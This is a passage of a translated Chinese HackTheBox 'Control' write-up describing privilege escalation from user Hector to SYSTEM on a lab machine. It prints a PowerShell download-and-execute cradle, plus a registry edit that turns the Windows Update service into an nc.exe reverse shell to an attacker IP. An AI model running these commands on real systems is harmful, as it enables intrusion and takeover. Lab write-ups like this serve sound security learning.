li km mg lk ll kq mh ln lo lp ij bi translated">然后，我使用凭据对象创建一个会话:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nz"><img src="../Images/5c2366b9b0606f14d7c2eda2cb9bfcba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1oYjZmtN8cddtWEK0K598Q.png"/></div></div></figure><p id="6d5d" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">最后，我可以在会话中调用一个命令，并以Hector的身份获得我的shell:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi oa"><img src="../Images/d06ae6de60c582e8d5339b5068c81152.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SKPI30tz1o_VHHDdnEOu4w.png"/></div></div></figure><p id="c06f" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我现在可以读取user.txt:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/a195598ebd363c65101716a1dd459621.png" data-original-src="https://miro.medium.com/v2/resize:fit:986/format:webp/1*AbFLsdf7A2peyCi-eolWVQ.png"/></div></figure><p id="3a51" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">从Hector到System32的权限:</p><p id="3570" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我试着用PowerShell得到一个shell，因为我想知道为什么我不能早点得到一个连接，看起来它被AV阻止了:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi oc"><img src="../Images/e2daf5288d48d7d6d4ba3592f240bf45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1c07bdUeEnUbZjH4YwVLBw.png"/></div></div></figure><p id="6909" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后我试着从<a class="ae jy" href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener ugc nofollow" target="_blank"> PowerSploit </a>运行PowerUp:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="7b2c" class="jz ka iq lv b gy lz ma l mb mc">iex(new-object net.webclient).downloadString('<a class="ae jy" href="http://10.10.14.7/p.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.7/p.ps1'</a>); Invoke-AllChecks</span></pre><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi od"><img src="../Images/7465efae415b9c8fca991b49c520d3c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RKV6kpmnmX0iT-a2YhxQew.png"/></div></div></figure><p id="3cb0" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">没有能让我找到另一个用户的有用信息。我在这一部分卡住了，有人建议我查看PowerShell历史文件。检查历史文件:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi oe"><img src="../Images/57b2032f772aa26c75cd0d4e23d7380b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jhHTvlGYHQ6ivxmjTILQQg.png"/></div></div></figure><p id="3e9c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我看到有2个命令被调用(type $env字符串只是我的命令的回显)。在谷歌搜索之后，我还可以使用下面的命令来检查历史文件的位置:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi of"><img src="../Images/4d650855d4d9cca44d7cf53379b404b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-_5r9ycpcSe2UoTDqbtYow.png"/></div></div></figure><p id="ffa3" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">你也可以看看这个来自<a class="ae jy" href="https://twitter.com/0xdf_" rel="noopener ugc nofollow" target="_blank"> 0xdf </a>的博客，它很好地概述了PowerShell历史文件。</p><div class="og oh gp gr oi oj"><a href="https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html" rel="noopener  ugc nofollow" target="_blank"><div class="ok ab fo"><div class="ol ab om cl cj on"><h2 class="bd ir gy z fp oo fr fs op fu fw ip bi translated">PowerShell历史文件</h2><div class="oq l"><h3 class="bd b gy z fp oo fr fs op fu fw dk translated">我遇到过一个情况，我发现了一个用户的PSReadline console host _ history . txt文件，它最后给出了…</h3></div><div class="or l"><p class="bd b dl z fp oo fr fs op fu fw dk translated">0xdf.gitlab.io</p></div></div></div></a></div><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi os"><img src="../Images/9639af6498334e0c0ab8117fb3463218.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Do1dbZELev8t1vo6GQ_aRQ.png"/></div></div></figure><p id="d0af" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">第一个命令只是执行路径HKLM:\SYSTEM\CurrentControlSet的列表，并通过管道将其传送到Format-List。第二条命令检查同一路径的ACL。运行第二个命令:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ot"><img src="../Images/cf33f2f3daaa5a906700883b32036fe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jUwkqt5ttif8LHfsKfJ3Rw.png"/></div></div></figure><p id="be33" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">说明Control\Hector有“完全控制权”。这意味着用户Hector可以更改系统中服务注册表的值。服务通常有一个“映像路径”，它是一个值条目，指定驱动程序映像文件的完全限定路径。这里的要点是能够通过更改服务的ImagePath的值来产生恶意进程。这里的问题是服务需要重新启动。我首先将服务列表的输出存储在变量$service上，这是一个很长的列表(被截断):</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ou"><img src="../Images/3f45f00a7d5b17ab7b5b0cf63ecd3ddd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TPtJaKbU9cGEKHKcGWpZ6Q.png"/></div></div></figure><p id="07f0" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">这里的问题是确定我可以重启哪个服务。我从列表的底部开始向上移动。我最终使用了wuauserv服务，这是一种用于Windows Update的服务。我也想过创建一个脚本来强制我重启哪个服务，但这是现实的。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ov"><img src="../Images/4562ae8214a2862ca13f2c1757c3218c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mCw2wlk4pJBXkcyMp2WMrg.png"/></div></div></figure><p id="13b2" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后，我可以将ImagePath值更改为netcat连接:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="dc76" class="jz ka iq lv b gy lz ma l mb mc">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\hector\music\nc.exe 10.10.14.7 9005 -e cmd.exe " /f</span></pre><p id="92bd" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">然后，我使用sc.exe启动服务:</p><pre class="lq lr ls lt gt lu lv lw lx aw ly bi"><span id="e326" class="jz ka iq lv b gy lz ma l mb mc">sc.exe \\fidelity start wuauserv</span></pre><p id="70fc" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">现在我得到了一个贝壳！在需要劫持服务的进程或图像路径的方法中，总是在获得连接后获取另一个shell，因为它们通常是不稳定的。</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ow"><img src="../Images/1bc17fe63c970a30ab70b5ae2681e719.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ms3fkDjfgsBzmxaUTqdwJw.png"/></div></div></figure><p id="79fb" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">我现在可以阅读root.txt:</p><figure class="lq lr ls lt gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/79b599cd8a3b2beac6b1ff7f633b0090.png" data-original-src="https://miro.medium.com/v2/resize:fit:1106/format:webp/1*FATCVhrxy-onk9JyW-Kw9w.png"/></div></figure><p id="f91c" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated">这就是我如何从HacktheBox中解决控制问题的！感谢阅读！🍺</p></div><div class="ab cl oy oz hu pa" role="separator"><span class="pb bw bk pc pd pe"/><span class="pb bw bk pc pd pe"/><span class="pb bw bk pc pd"/></div><div class="ij ik il im in"><p id="d9da" class="pw-post-body-paragraph kv kw iq kx b ky md la lb lc me le lf ki mf lh li km mg lk ll kq mh ln lo lp ij bi translated"><em class="pf">关注</em> <a class="ae jy" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="pf"> Infosec报道</em> </a> <em class="pf">获取更多此类精彩报道。</em></p><div class="og oh gp gr oi oj"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ok ab fo"><div class="ol ab om cl cj on"><h2 class="bd ir gy z fp oo fr fs op fu fw ip bi translated">信息安全报道</h2><div class="oq l"><h3 class="bd b gy z fp oo fr fs op fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="or l"><p class="bd b dl z fp oo fr fs op fu fw dk translated">medium.com</p></div></div><div class="pg l"><div class="ph l pi pj pk pg pl js oj"/></div></div></a></div></div></div>    
</body>
</html>